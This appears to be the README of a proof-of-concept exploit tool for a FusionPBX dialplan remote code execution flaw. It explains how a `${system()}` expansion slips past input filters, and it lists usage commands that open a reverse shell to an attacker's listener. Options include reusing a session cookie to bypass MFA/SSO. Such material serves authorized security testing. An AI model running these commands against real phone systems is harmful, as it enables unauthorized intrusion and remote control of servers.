# FusionPBX Dialplan RCE Proof of Concept

![Python Version](https://img.shields.io/badge/python-3.8+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Security](https://img.shields.io/badge/Security-PoC-red.svg)

## ⚠️ Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED PENETRATION TESTING PURPOSES ONLY.**

This tool is a Proof of Concept (PoC) demonstrating a Remote Code Execution (RCE) vulnerability via a system-filter bypass in FusionPBX dialplan configurations. The author is not responsible for any misuse or damage caused by this tool. Always ensure you have explicit permission before testing on any target system.

---

### Vulnerability Mechanism
The exploit targets the way FusionPBX processes dialplan data. By injecting a specific command string during the configuration save process, the tool bypasses standard input filters, allowing the `${system()}` expansion to be retained in the configuration. When the dialplan is subsequently executed (triggered via a call), FreeSWITCH expands the command, leading to RCE.

---

### Usage
```bash
python3 exploit.py --base-url <URL> --lhost <IP> --lport <PORT> [OPTIONS]
python3 exploit.py -t https://pbx.lab.example --username admin --password Password123 --insecure --trigger-local --lhost X.X.X.X --lport XXXX

--base-url	The target FusionPBX base URL (e.g., https://pbx.lab.example or https://host/fusionpbx/).
--lhost	The IP address of your listener (the machine receiving the reverse shell).
--lport	The port on your listener machine (e.g., 4444).
--cookie	An existing authorized session cookie (e.g., PHPSESSID=xyz...). Use this to bypass MFA/SSO.
--username	The FusionPBX username (requires --password).
--password	The password for the specified user.
--domain-name	The FusionPBX login domain name (required if the login form/domain configuration requires it).
--insecure	Disable TLS certificate validation. Use only in isolated lab environments.
--trigger-local	Attempts to trigger the route automatically using the local fs_cli (must be run on the PBX host).
--fs-cli-path	Path to the local fs_cli binary (default: /usr/bin/fs_cli).
--sudo-fs-cli	Use sudo -n to invoke fs_cli non-interactively (requires existing sudo authorization).
--context	Test dialplan context (default: ${domain_name}).
--trigger	Specific digits to dial to trigger the shell (default: random 8-digit number).

Note: You must provide either a session cookie OR credentials.

